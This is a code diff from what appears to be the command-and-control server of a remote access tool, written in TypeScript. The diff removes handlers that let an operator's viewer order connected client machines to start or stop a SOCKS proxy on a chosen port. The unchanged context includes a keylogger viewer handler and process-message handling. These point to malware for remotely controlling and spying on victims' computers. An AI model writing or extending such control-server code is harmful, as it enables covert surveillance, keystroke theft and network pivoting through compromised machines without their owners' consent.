@@ -311,54 +311,6 @@ export function handleProcessMessage(clientId: string, payload: any) {
   }
 }
 
-export function handleProxyViewerOpen(ws: ServerWebSocket<SocketData>) {
-  const { clientId } = ws.data;
-  const sessionId = uuidv4();
-  const target = clientManager.getClient(clientId);
-  const session = { id: sessionId, clientId, viewer: ws, createdAt: Date.now() };
-  sessionManager.addProxySession(session);
-  ws.data.sessionId = sessionId;
-  logger.info(`[proxy] viewer connected session=${sessionId} client=${clientId}`);
-  safeSendViewer(ws, { type: "ready", sessionId, clientId, clientOnline: !!target });
-  if (!target) {
-    safeSendViewer(ws, { type: "status", status: "offline", reason: "Client is offline", sessionId });
-  }
-}
-
-export function handleProxyViewerMessage(ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) {
-  const payload = decodeViewerPayload(raw);
-  if (!payload || typeof payload.type !== "string") return;
-  const { clientId } = ws.data;
-  const target = clientManager.getClient(clientId);
-  if (!target) {
-    safeSendViewer(ws, { type: "status", status: "offline" });
-    return;
-  }
-
-  const commandId = uuidv4();
-  switch (payload.type) {
-    case "proxy_start": {
-      const port = typeof payload.port === "number" ? payload.port : 1080;
-      target.ws.send(encodeMessage({ type: "command", commandType: "proxy_start", id: commandId, payload: { port } } as any));
-      metrics.recordCommand("proxy_start");
-      break;
-    }
-    case "proxy_stop":
-      target.ws.send(encodeMessage({ type: "command", commandType: "proxy_stop", id: commandId } as any));
-      metrics.recordCommand("proxy_stop");
-      break;
-    default:
-      break;
-  }
-}
-
-export function handleProxyMessage(clientId: string, payload: any) {
-  for (const session of sessionManager.getAllProxySessions().values()) {
-    if (session.clientId !== clientId) continue;
-    safeSendViewer(session.viewer, payload);
-  }
-}
-
 export function handleKeyloggerViewerOpen(ws: ServerWebSocket<SocketData>) {
   const { clientId } = ws.data;
   const sessionId = uuidv4();
